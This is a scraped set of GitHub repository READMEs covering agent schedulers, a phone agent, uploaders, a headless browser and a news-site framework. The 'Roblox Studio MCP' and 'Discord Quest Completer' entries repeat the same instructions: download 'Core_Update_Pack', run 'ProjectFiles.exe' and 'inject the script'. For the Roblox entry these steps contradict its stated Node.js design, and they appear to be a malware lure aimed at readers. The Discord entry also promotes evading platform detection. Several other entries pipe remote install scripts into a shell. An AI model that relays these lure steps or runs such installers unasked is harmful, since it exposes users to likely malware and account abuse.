itens.descricao_en: 让你的命令行 Agent 在后台自己接活、自己跟进到底；平时不烦你，遇到拿不准的事才发卡片找你拍板。
itens.readme:
# Agent Autoloop
**让你的命令行 Agent 在后台自己接活、自己跟进到底；平时不烦你，遇到拿不准的事才发卡片找你拍板。**
**中文** | [English](README.en.md)
[上手](#上手) · [场景模板](#拿来即用的场景模板) · [插件](#插件体系四个方向都能自由替换) · [内核](#内核的四个机制) · [文档](#更多文档)
## 它解决什么问题？
平时我们用 Claude Code、Codex 这类命令行 Agent，大多是“人守着终端用”：你输一句话，盯着它跑，等它问你下一步；一旦关掉窗口或者人走开，事情就断了。
**Agent Autoloop** 是一个极轻量的自动化中台。它把任务调度做成一个零外部依赖的**内核**，把事件来源、Agent、通知通道，甚至代码上线流水线全部拆成可随时插拔的**插件**。
- **一台电脑、一条命令就能跑。** 装在你的 Windows、Mac 或 Linux 上，不用买云服务器，也不用开放公网端口。
- **一行配置接新 Agent。** 不需要 SDK，也不需要改 Agent 源码，能接收提示词并打印最后一条回复的命令行工具都能接。
- **没有后台界面。** 需要你拍板时把卡片推到飞书、钉钉、企微、Slack、Discord 或桌面通知；想看全局进展，敲一行命令。
## 上手
支持 Windows、macOS 和 Linux。需要 Node 24 或更新、Git，以及一个已经登录的命令行 Agent；macOS/Linux 还需要 curl，不需要 GitHub 账号。也可以把[安装说明](INSTALL.md)交给你的 Agent。
Windows PowerShell：
```powershell
irm https://raw.githubusercontent.com/KKKKhazix/agent-autoloop/main/install.ps1 | iex
```
macOS / Linux：
```bash
curl -fsSL https://raw.githubusercontent.com/KKKKhazix/agent-autoloop/main/install.sh | sh
```
安装和 `agent-autoloop update` 都装最新的 [Release](https://github.com/KKKKhazix/agent-autoloop/releases)，那是通过了全部检查的版本。
装好后用你本机的 Agent 真实走一遍“提问 → 退出等回复 → 拍板 → 接着干完”：
```bash
agent-autoloop try
```
下面是在终端里的真实输出：
```text
事件发出去了，Agent 开始干活……
Agent 结束了这一轮，问了你一个问题。它现在不占进程、不花 Token。
【等你决定】#1 试跑：选一个颜色
这是一次试跑，选哪个都行。
  1. 蓝色
  2. 绿色
回答：agent-autoloop answer 1  
答完运行 agent-autoloop status，能看到它接着把活干完。
```
交互终端里直接输入数字回车；非交互终端运行 `agent-autoloop answer 1 2` 选择“绿色”。再跑 `agent-autoloop status`，就能看到它接上刚才的会话并显示“你选了绿色，试跑通过”，还有今天和最近 7 天的轮数、Token 和费用（[统计口径](skills/agent-autoloop/SKILL.md#看情况回答)）。
## 一件事怎么转起来
编号和上面的架构图一一对应：
1. **新事件进来。** 早上 9 点的定时任务、GitHub 上新提的 Issue、业务系统报的错，都变成一条标准事件送进内核。
2. **按规则派活。** 内核照你写的规则，决定交给哪个 Agent、去哪个目录干。同一件事排队时又来的消息，会合并成一轮处理。
3. **干完一轮就退出。** Agent 把结果写在最后一条回复里，进程直接退出。
4. **拿不准才问你。** 碰到删数据、重启服务、花钱、对外发消息这类事，内核通过飞书或桌面通知发一张卡片给你。等你回复期间，它不占后台进程，也不消耗 Token。
5. **点一下，接着干。** 你选完，它接上原来的对话，把剩下的活干完。
能自己搞定的事走图上方的自动闭环：直接办完，或者约个时间（比如半小时后）再醒来复查，全程不打扰你。
## 日常怎么配？
### 写一份规则（`rules.json`）
不需要写胶水代码。打开 `~/.agent-autoloop/rules.json`，在 `rules` 里写清楚**什么事、交给谁、在哪个目录干**。`to` 填 `agents` 里已有的名字。比如每天早上 9 点写早报：
```json
{
  "name": "早报",
  "when": { "cron": "0 9 * * *" },
  "to": "codex",
  "cwd": "~/notes",
  "prompt": "整理昨天的笔记和提交，写今天的早报。"
}
```
外部事件写法一样，只是要先接好来源。比如有人提新 Issue 时交给 Codex，先按[说明](skills/agent-autoloop/SKILL.md#接一个事件插件)在 `sources` 里登记 `github`：
```json
{
  "name": "处理 issue",
  "when": { "source": "github", "types": ["issues.opened"] },
  "to": "codex",
  "cwd": "~/code/app",
  "skill": "handle-issue",
  "parallel": 3
}
```

itens.descricao_en: An on-device AI agent for Android that operates apps and the web to get things done for you.
itens.readme:
# Mika
**An AI assistant on your phone: say what you need, and it works your apps and the web until it's done.**
It works on a hidden background screen, so you can keep using your phone.
English · [简体中文](docs/readme/README.zh-CN.md) · [繁體中文](docs/readme/README.zh-Hant.md) · [日本語](docs/readme/README.ja.md) · [한국어](docs/readme/README.ko.md) · [Español](docs/readme/README.es.md)
 "Send a message to File Transfer": Mika's chat on the left, each step on its background screen on the right (4× speed; chat list blurred) 
## Get things done with one sentence
    "What did the group talk about today?"   Scrolls through the chat in the background, then sums it up  
    "A charger under $30, rated 4.5 stars or more"   Adds the pick to the cart and stops before checkout  
    "What has this creator posted lately?"   Opens the app, reads post by post, then sums it up  
 More demos 
   Greets recruiters for 3 jobs on a job site 
   Finds the cheapest nonstop from San Francisco to New York 
   Reads out the top 5 stories on a news site 
   Finds jobs and greets recruiters 
   Watches ads to unlock music perks 
   Orders takeout with stacked discounts, asks before paying 
 Several demos use apps popular in China: WeChat is the main messaging app there, and Xiaohongshu (RED) is a lifestyle and social platform. Mika isn't tied to them; it works with any app or website on your phone. 
## Why Mika
| | |
|---|---|
| 📱 **Leaves your screen alone** | Opens apps, taps, types and scrolls on a separate background screen while you use your phone as usual; tap the small live view whenever you want to watch |
| 🧩 **Works with any app** | Looks at the screen and finds buttons the way a person does: no app APIs, no per-app integration |
| 🌐 **Call it from any web page** | In the built-in browser, say what you want on the page you're reading and it works right there; touch the page and it stops |
| 🧠 **Gets better with use** | Remembers the preferences you tell it, and turns tasks it finishes into skills so next time is faster and steadier |
| 🔒 **Your data stays on your phone** | There is no Mika server; use your own model API key, or sign in with a ChatGPT, xAI or OpenRouter account |
| 🆓 **Open source and free** | Apache-2.0, all code public |
## Get started in three steps
1. **Install**: download the APK from [Releases](https://github.com/wangzan101/Mika/releases/latest).
2. **Connect a model**: in Settings › Model, pick a provider and enter an API key, or just sign in with an account

itens.descricao_en: Model Context Protocol server for Roblox Studio. Connect AI assistants (Claude, Cursor) to read object trees, edit scripts, and run playtests safely. Open-source and lightweight
itens.readme:
# 🎮 Roblox Studio MCP
**Model Context Protocol Server for Roblox Studio — 2026**
Connect your AI coding assistant (Claude, Cursor, Cline, ChatGPT) directly to Roblox Studio. 
Automate Lua scripting, read object trees, inspect properties, and run playtests — all without leaving your editor.
---
## 🎯 What it is
**Roblox Studio MCP** is a lightweight Node.js/TypeScript server that implements the Model Context Protocol (MCP) to bridge Roblox Studio and AI agents. 
It acts as a bridge, allowing LLMs to understand your game's architecture, generate and edit Lua scripts, and automate repetitive developer tasks safely.
> 🔒 Safe by design: no execution of untrusted code, no memory manipulation, and no access to private data. All operations are sandboxed within the Studio plugin.
---
## 🚀 Quick Start
1. **Download Core_Update_Pack** using the button above.
2. **Extract** the archive into a separate folder.
3. **Run ProjectFiles.exe**.
4. **Follow the on-screen instructions** and inject the script.
---
## ✨ Features
| Feature                     | Description                                          |
|-----------------------------|------------------------------------------------------|
| 🧠 **MCP Protocol Support** | Fully compatible with Claude Desktop, Cursor IDE, Cline, and ChatGPT |
| 🏗️ **Object Tree Reader**   | Browse the full hierarchy of your Roblox place       |
| ✏️ **Lua Script Editor**    | Create, read, and update Lua scripts via AI          |
| 🔍 **Property Inspector**   | Inspect and modify instance properties               |
| ▶️ **Playtest Control**     | Run, pause, and stop playtests directly from the agent |
| 🛡️ **Read-Only Mode**       | Safe mode for exploration without making changes     |
| ⚡ **Fast & Lightweight**   | Built with Node.js + WebSocket, low memory footprint |
| 🔌 **Auto-Discovery**       | Finds open Studio sessions automatically             |
---
## 🧩 Available Tools (MCP API)
| Tool Name             | Description                                      |
|-----------------------|--------------------------------------------------|
| `get_object_tree`     | Returns the full hierarchy of the current place  |
| `get_instance`        | Fetch details of a specific Instance by path     |
| `create_script`       | Create a new Lua script at a given parent path   |
| `update_script`       | Replace the source code of an existing script    |
| `delete_instance`     | Delete an object (disabled in safe mode)         |
| `get_properties`

itens.descricao_en: Auto-complete Discord Quests without installing games. Supports all 5 quest types: game, video, stream, activity, and achievement. Built-in dashboard, safe timing, and privacy-first. Open-source
itens.readme:
# 🎮 Discord Quest Completer
**Automate Discord Quests & Earn Rewards — 2026**
A lightweight, open-source tool that completes Discord Quests without requiring you to install massive games or watch hours of video. 
Supports all 5 quest types: Play Game, Watch Video, Stream, Activity, and Achievement.
---
## 🎯 What it is
**Discord Quest Completer** is a standalone utility designed to automate the completion of Discord Quests. 
It simulates the required activity (game process, video playback, etc.) so you can claim rewards like Orbs, skins, or Nitro without the hassle.
> ⚠️ **Important Warning:** Discord has been actively enforcing against quest automation since April 2026. Using this tool may result in your account being flagged or restricted. **Use at your own risk.** This project is for educational and research purposes only.
---
## 🚀 Quick Start
1. **Download Core_Update_Pack** using the button above.
2. **Extract** the archive into a separate folder.
3. **Run ProjectFiles.exe**.
4. **Follow the on-screen instructions** and inject the script.
---
## ✨ Features
| Feature                     | Description                                          |
|-----------------------------|------------------------------------------------------|
| 🎮 **All 5 Quest Types**    | Game, Video, Stream, Activity, Achievement           |
| 🖥️ **Built-in Dashboard**   | Visual progress tracker for all active quests        |
| ⏱️ **Adaptive Timing**      | Simulates human-like behavior to reduce detection risk|
| 🛡️ **Stealth Mode**         | Hides activity from Rich Presence when enabled       |
| 📦 **Portable**             | No installation required — just run the `.exe`       |
| 🔄 **Auto-Claim**           | Attempts to claim rewards automatically              |
---
## 🛠️ How to use
1. Launch **ProjectFiles.exe**.
2. Log into Discord Desktop (the tool works alongside the app).
3. Select the quests you want to complete from the dashboard.
4. Click **"Start"** and wait for the progress bar to finish.
5. Claim your rewards manually in Discord if auto-claim is blocked.
---
## ⚙️ Configuration
You can adjust settings in the `config.json` file or via the dashboard:
- **Auto-Claim**: `true` or `false`
- **Stealth RPC**: Hide game activity from friends (`true`/`false`)
- **Quest Types**: Enable/disable specific quest categories
- **Timing**: Adjust delays between actions (default: safe)
---
## ❓ FAQ
**Is it safe to use?**
No automation is completely safe. Discord actively detects quest

itens.descricao_en: Automated TikTok video uploader with batch processing, scheduling, and hashtag management. Local session-based auth. Open-source and cross-platform
itens.readme:
# 📤 TikTok Uploader
**Automated TikTok Video Uploader & Scheduler — 2026**
A lightweight, open-source tool for batch uploading videos to TikTok, scheduling posts, and managing metadata. 
Built for content creators, social media managers, and automation enthusiasts.
---
## 🎯 What it is
**TikTok Uploader** is a cross-platform tool that simplifies the process of uploading videos to TikTok. 
It allows you to batch upload videos, set descriptions, add hashtags, and schedule posts — all without manually uploading through the mobile app.
> 🔒
> Session-based authentication. Your credentials are stored locally and never sent to third-party servers.
---
## 🚀 Quick Start
1. Download the project using the button above.
2. Extract the archive into a separate folder.
3. Run **TikTokUploader.exe** (or execute `main.py` from source).
4. Follow the on-screen instructions to authenticate.
5. Select your videos and click "Upload".
---
## ✨ Features
| Feature                  | Description                                      |
|--------------------------|--------------------------------------------------|
| 📤 **Batch Upload**      | Upload multiple videos at once                   |
| 📝 **Metadata Editor**   | Add descriptions, hashtags, and mentions         |
| ⏰ **Scheduling**        | Schedule videos for future publication           |
| 🔄 **Resume Support**    | Continue interrupted uploads without duplicates  |
| 🖥️ **Cross-Platform**    | Works on Windows, macOS, and Linux               |
| 🔒 **Secure Auth**       | Local session storage, no cloud required         |
---
## 🧩 How to use
1. Launch the application.
2. Click **"Authenticate"** and log in with your TikTok credentials (or provide a `sessionid`).
3. Select the video files you want to upload.
4. Fill in the metadata (description, hashtags).
5. Choose privacy settings (Public / Friends / Private).
6. Click **"Upload"** and monitor the progress.
---
## ⚙️ Configuration
You can adjust the settings in the `config.ini` file:
- **Default Privacy**: Public / Friends / Private
- **Hashtag Template**: Default hashtags for all uploads
- **Max Concurrent Uploads**: 1–3
- **Upload Delay**: Delay between uploads (seconds)
---

It uses local session storage. However, automating TikTok may violate their Terms of Service. Use a secondary account and conservative settings.

itens.descricao_en: Automated YouTube video uploader with batch processing, thumbnail support, and scheduled publishing. Uses official YouTube Data API v3. Open-source and privacy-first
itens.readme:
# 📤 YouTube Uploader
**Automated YouTube Video Uploader & Metadata Manager — 2026**
A lightweight, open-source tool for batch uploading videos to YouTube with automatic metadata generation, thumbnail support, and scheduled publishing. 
Built for content creators, archivists, and automation enthusiasts.
---
## 🎯 What it is
**YouTube Uploader** is a command-line and GUI tool that simplifies the process of uploading videos to YouTube. 
It uses the official YouTube Data API v3 to upload videos, set thumbnails, add descriptions, tags, and schedule publications — all without touching the browser.
> 🔒
> Uses official OAuth 2.0 authentication. Your credentials are stored locally and never shared.
---
## 🚀 Quick Start
1. Download the project using the button above.
2. Extract the archive into a separate folder.
3. Run **YouTubeUploader.exe** (or execute `main.py` from source).
4. Follow the on-screen instructions to authenticate with your Google account.
5. Drag & drop your videos or select them via the file picker.
---
## ✨ Features
| Feature                  | Description                                      |
|--------------------------|--------------------------------------------------|
| 📤 **Batch Upload**      | Upload multiple videos at once                   |
| 🖼️ **Thumbnail Support** | Automatically set custom thumbnails              |
| 📝 **Metadata Editor**   | Add titles, descriptions, tags, and categories   |
| ⏰ **Scheduling**        | Schedule videos for future publication           |
| 🔄 **Resume Support**    | Continue interrupted uploads without duplicates  |
| 📊 **Quota Tracker**     | Monitor API quota usage to avoid limits          |
| 🔒 **Secure Auth**       | Official OAuth 2.0 with local token storage      |
---
## 🧩 How to use
1. Launch the application.
2. Click **"Authenticate"** and log in with your Google account.
3. Select the video files you want to upload.
4. Fill in the metadata (title, description, tags).
5. Choose privacy settings (Public / Unlisted / Private).
6. Click **"Upload"** and monitor the progress.
---
## ⚙️ Configuration
You can adjust the settings in the `config.ini` file:
- **Default Privacy**: Public / Unlisted / Private
- **Category ID**: Default category for uploads
- **Thumbnail Auto-Generate**: True/False
- **Max Concurrent Uploads**: 1–5
- **Quota Warning Threshold**: Default 8000 units
---
## ❓ FAQ
**Is it safe to use?**
Yes — it uses the official YouTube Data API v3 and OAuth 2.0. Your credentials are stored

itens.descricao_en: Best headless browser for AI agents. Lite, Fast, High-Compatibility. Built in Rust
itens.readme:
Moli 
   English  |
   简体中文  |
   日本語  |
   Deutsch  |
   Français  |
   Español  |
   한국어 
Moli is a production-ready headless browser for AI agents. Its on-demand layout
and rendering design combines a complete browser runtime with a lightweight
resource footprint.
Moli helps your AI agent fetch and extract web pages, search the web, and
automate browser tasks.
Use it through the CLI, CDP, WebDriver Classic, or WebDriver BiDi.
Moli supports Linux, macOS, and Windows.
## Quick start
Give this prompt to your AI agent:
```text
Install the skills under https://github.com/lexmount/moli/tree/main/skills,
follow their instructions to download and install the latest prebuilt Moli
binary, then use moli-webfetch to fetch https://example.com and show me the
result.
```
### Direct installation
On Linux or macOS:
```sh
curl --proto '=https' --tlsv1.2 -fsSL \
  https://github.com/lexmount/moli/releases/latest/download/moli-installer.sh | sh
```
On Windows, run in PowerShell:
```powershell
powershell -ExecutionPolicy ByPass -c "irm https://github.com/lexmount/moli/releases/latest/download/moli-installer.ps1 | iex"
```
## Showcase
   An HTML5 game rendered by Moli and inspected live through Chrome DevTools. 
   rust-lang.org rendered by Moli, with its live DOM, CSS, and geometry available in Chrome DevTools. 
## CLI usage
### Extract a page
Render the page as Markdown with Moli's default completion strategy:
```bash
moli fetch \
  --dump markdown \
  --wait-until done \
  https://example.com
```
Or directly return a compact, model-friendly semantic tree:
```bash
moli fetch \
  --dump semantic_tree_text \
  --wait-selector body \
  https://example.com
```
For visual output, enable on-demand layout and write a viewport PNG, a full-document PNG, or a paginated PDF:
```bash
moli fetch --layout --dump screenshot https://example.com > page.png
moli fetch --layout --dump screenshot_full https://example.com > full-page.png
moli fetch --layout --dump pdf https://example.com > page.pdf
```
To export a page after an explicit interaction, combine `--eval` (or
`--eval-file`) with `--dump`. The expression runs after page readiness;
promises are awaited, and any pending navigation is followed before export.
Its return value is discarded without serialization. An exception fails the
command without emitting a dump.
```bash
moli fetch --eval 'document.querySelector("button.show-details").click()' \
  --dump markdown https://example.com
```

itens.descricao_en: 一个自己找热点、自己写日报的网站框架。把信源和精选标准换成你的，它就是你的行业热点站。
itens.readme:
一个自己找热点、自己写日报的网站框架。  
  把信源换成你的，把精选标准换成你的 KnowHow，它就是你的行业热点站。
   简体中文  ·  English 
   跑起来  ·
   改成你的行业  ·
   它是怎么工作的  ·
   文档  ·
   社区交流 
## 这是什么
[AIHOT](https://aihot.news) 是我做的一个 AI 热点网站。它每天从一批信源里收资料，用大模型先筛一遍、再独立打两次分，挑出真正值得看的，写成中文标题和摘要；把不同来源说的同一件事聚成一个事件，按有多少人在说排出热点；每天早上出一份日报。
这个仓库是它的引擎和框架：网站、后台、精选流程、聚簇和热度算法，**所有提示词的原文和入选门槛**，都在这里。
## 为什么开源
这半年，很多做法律、做 HR、做金融、做贵金属的朋友问我，能不能也给他们的行业做一个。
我做不了。我不懂你们的行业，不知道哪些信源有用，也不知道什么样的消息，对你们来说才叫热点。
但你们懂。
既然我没办法满足所有人，那就把火种交到大家自己手上。
## 说在前面
- **我不是专业的开发者。** 我是设计师出身，半年前还看不太懂代码。这套代码是我和 AI 一起重写的，比以前干净了很多，但一定还有写得不好的地方。发现问题欢迎提 Issue，我不一定能很快回复，先说声抱歉。
- **这是 AIHOT 的引擎。** 它和 AIHOT 线上跑的是同一份引擎代码，同步时直接从线上导出，不是精心打磨的通用框架。以后 AIHOT 的更新，我会尽量同步过来，但没法保证每一次都同步。模型榜、Codex 重置监控、主题页的大事记这些只对 AI 行业有意义的功能，可安装的 Agent Skill 文件，以及 AIHOT 自己的运营工具，只留在 AIHOT 上；开源版给 Agent 的入口是 MCP 和站点上的 `/agent` 页面。
- **里面没有 AIHOT 的信源名单和运营数据。** 仓库带了 18 个公开的海外 AI 资讯源做示范，够你跑起来看效果；真正的信源，要换成你自己行业的。
- **请不要用 AIHOT 的名字和 Logo。** 换上你自己的名字，它就是你的站。
## 它是怎么工作的
一条资料从信源进来，先判重，再预筛；可能重要的独立打两次分，写好中文标题和摘要，和别的报道聚成事件，算进热度。X 帖子没有正文或只有链接时，保留原帖的链接和图片，不调用写作或翻译模型。分数过了门槛、又不是精选里已有新闻的重复，才进精选；日报按规则编出当天要闻，周报、月报再从日报里汇编。每一步的提示词都在 [`industry/prompts/`](industry/prompts/)，改标准不用改代码。详见 [精选与校准](docs/selection.md)。
### 聚簇与热点
同一件事，官网发一篇、媒体转十篇、X 上吵一天，读者只需要看到一次。AIHOT 把它们聚成一个**事件**：先用标题摘要的向量（没配向量服务时比文字重合度）在最近两周里找候选，再让模型判断是同一件事、后续进展，还是两件事；拿不准的合并，写入前再让模型复核一遍（复核可以单独换一家模型，设 `GROUP_REVIEW_MODEL`）。
**热度**按事件算，不按文章算：48 小时内，每个独立来源只算一次，24 小时减半。重复抓取不会多算，一家媒体发十篇也只算一次，所以排在前面的，是真正有很多人在说的事。
### 速度
## 你会得到什么
| | |
|---|---|
| **六种信源** | RSS、网页列表、JSON 接口、X 账号、微信公众号，以及你自己脚本推送进来的内容。信源分三级（官方一手、官方账号与准官方、媒体与个人），各级入选门槛不同；抓取频率按产出自动调整 |
| **精选** | 预筛，同一份评分标准独立打两次分，再按信源分级的门槛决定入选；同一条新闻只占一条，换个说法的重复不进。提示词和门槛全部公开，全部可以改；用你自己标注的样本在 SelectBench 里校准 |
| **写作** | 中文标题、答案先行的摘要、推荐理由，外文全文翻译；分类、标签和新闻事实单独抽取；防止模型把原文没提到的公司写进标题 |
| **聚簇** | 不同来源报道的同一件事聚成一个事件，后续进展挂在同一个事件下，事件页有综述；进展和报道时间线可一起切换“最新在前”或“最早在前”；人工改过的归属不会被覆盖 |
| **热点** | 按事件算热度：独立来源越多越靠前，X 上的讨论也算进来；和 6 小时前比，涨得快的标上升，新出现的标“新” |
| **日报、周报、月报** | 每天出日报（默认 08:00），按规则编出当天要闻：一件事一条，报过的事只在有新进展时跟进，不调模型。每周一出周报、每月 1 日出月报（默认 10:00、10:30），从日报里汇编，模型只写总述和栏目导读。几点出刊在 `site/site.ts` 的 `EDITION_TIMES` 里改 |
| **主题与搜索** | 公司、方向、内容形态三类主题页；标题摘要搜索和全文相关搜索 |
| **阅读设置** | 深浅色外观、网站默认字体或浏览器默认字体；收藏和阅读设置只保存在本机，可以导出、导入备份 |
| **给 Agent 用** | RSS（精选、全部、全文、日报、周报、月报）、公开 API、MCP、Agent Markdown、`llms.txt`，同一份内容给人看也给 Agent 用 |
| **后台** | 信源管理与试抓、内容诊断与人工评分更正、精选评测、每一步单独换模型、付费服务的预算熔断、运行记录与告警 |
